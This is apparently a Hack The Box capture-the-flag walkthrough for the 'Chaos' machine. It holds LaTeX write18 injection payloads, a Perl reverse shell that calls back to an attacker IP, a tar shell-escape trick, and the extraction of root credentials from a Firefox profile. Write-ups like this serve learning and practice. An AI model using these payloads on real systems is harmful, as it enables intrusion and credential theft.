@@ -1,0 +1,191 @@
+Chaos HTB
+
+Linux 
+difficulty - Hard
+
+This box is Chaos from Hack the box and was one heck of a ride as this one was all over the place.
+We first enumerate as usual and find some interesting ports open. including pop 110 and imap
+which got me curious right away about what was going on there. 
+
+------------------------------------------------------------------------------------------------------------
+PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL PIPELINING STLS AUTH-RESP-CODE RESP-CODES CAPA UIDL TOP
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ listed ID have post-login more OK capabilities IDLE Pre-login LOGINDISABLEDA0001 IMAP4rev1 ENABLE LOGIN-REFERRALS STARTTLS SASL-IR
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ ID post-login have more OK listed IDLE capabilities AUTH=PLAINA0001 Pre-login ENABLE LOGIN-REFERRALS IMAP4rev1 SASL-IR
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) PIPELINING USER AUTH-RESP-CODE RESP-CODES CAPA UIDL TOP
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+-------------------------------------------------------------------------------------------------------------
+
+First started by probing the web app on port 80 and found a directory for wp here
+http://10.10.10.120/wp/wordpress this had a set of creds on the page and by testing them in multiple areas it led to me to try them for webmail. 
+
+I used thunder heard others use other methods including manaully I went with the
+easy way and connected to the mailbox I then found some files there. 
+
+used this method to decrypt the password
+for chaos in email files. 2 files one encrypted
+the other a python file but is missing the rest of 
+the code so by a little research found the rest of it :).
+
+After downloading the python script from github I then used it to decrypt the message 
+in there as you can see printed out below. 
+
+-----------------------------------------------------------------------------------------------------------
+
+To decrypt file needed password - ***ay [you have to guess the password to decrypt very easy]
+
+0011071933
+***Advanced Encryption Standard (AES) is use to encrypt all files in this program***
+*Enter E to Encrypt the File
+*Enter D to Decrypt the File
+Do you want to Encrypt or Decrypt?: D
+Enter the File name: enim_msg.txt
+Password: 
+Decryption Done.
+
+base64 encrypted after decrypted file enim_msg.txt
+
+SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucy
+AtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9j
+aGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
+
+result is -  
+
+Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+
+--------------------------------------------------------------------------------------------------------
+
+As we can see nnow the output he points to a pdf maker on a specific port and I also failed to mention
+make sure you shove on all boxes if you notice DNS names to /etc/hosts some may not be reachable from
+raw IP addresses always watch out for that pretty much an unsaid thing in the hacker world when testing
+boxes.
+
+By then going to the pdf maker we take a look and see its a version of Latex pdf maker. After
+digging around articles I come across this one https://0day.work/hacking-with-latex/. So now 
+we know what to do we start to test this out and see if this is a foothold to the box or at best
+can we at least read some files.
+
+I found working from burp was the best method you may choose other routes as you play around as my writeups will only be mere guides and try to not give away some fun parts you may want to work out
+yourself trying the stuff yourself as this is how we all learn. 
+
+first gave this a shot -
+
+\immediate\write18{ls |base64> test.tex}
+\input{test.tex}
+
+
+Aha this worked! ahoy we have music so after playing around with it reading files for example
+I tried several different exploiting methods as now I was certain rce was possible if I can 
+write files to the box. 
+
+I then went for exploits and aha got one to work I then fired up
+netcat on my box nc -lvp 1234 and boom got it. 
+
+\immediate\write18{perl -e 'use Socket;$i="10.10.14.157";$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
+open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
+
+after getting on the box there was no route to ayush except guessing the password jitj***
+
+I was then on the box and noticed as others may have done this differently
+and believe me this box was something else so this is how I got it done as sometimes my
+methods maybe more out of the norms. I could not read user.txt with the ayush user
+
+----------------------------------------------------------------------------------------------------------
+
+Was testing the waters was still never able to directly read user.txt so I found a workaround
+by abusing the echo command this was how I did it. 
+
+Then escaped to shell to python -c 'import pty; pty.spawn("/bin/bash")'
+
+ayush@chaos:/tmp/test$ tar cf test /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+<l --checkpoint=1 --checkpoint-action=exec=/bin/bash
+tar: test: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+ayush@chaos:/tmp/test$ export PATH=$path:/usr/bin
+export PATH=$path:/usr/bin
+ayush@chaos:/tmp/test$ cd /
+cd /
+ayush@chaos:/$ cd /home/ayush
+
+got user.txt abusing echo command lmfao
+
+ayush@chaos:/home$ echo "$(</home/ayush/user.txt)"
+echo "$(</home/ayush/user.txt)"
+*************0286970dc713e1
+
+Bam got it and now started to probe the box and found after figuring out the user password was the same one
+jiu**** hint hint for user ayush I was able to ssh in and out better.
+
+Probing the box further I noticed something right away and was defintely out of place on a CTF box an config
+area in home directory for Mozilla. Knowing like any other maybe that may be the way to root by finding credentials in there so lets dive in.
+
+
+I found a python script on github others may of used something different or different methods this is how I did it. I first got the script on the box by using wget and firing up apache on my box with 123.py in my root directory of my local web server.
+
+
+Once I had the file on the box to test the waters with firefox I was ready to go
+
+----------------------------------------------------------------------------------------------------------
+ayush@chaos:/tmp$ python 123.py
+python 123.py
+
+Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: jiu**** [enter user password]
+
+it printed out something special lol
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv*****'
+
+ayush@chaos:/tmp$ su
+su
+Password: Thiv******
+
+root@chaos:/tmp# cat /root/root.txt
+cat /root/root.txt
+4eca7e09e3520e02***************
+-----------------------------------------------------------------------------------------------------------
+
+Got it rooted :))) will get pics up with blog and links soon 
+
+HTP and be well...
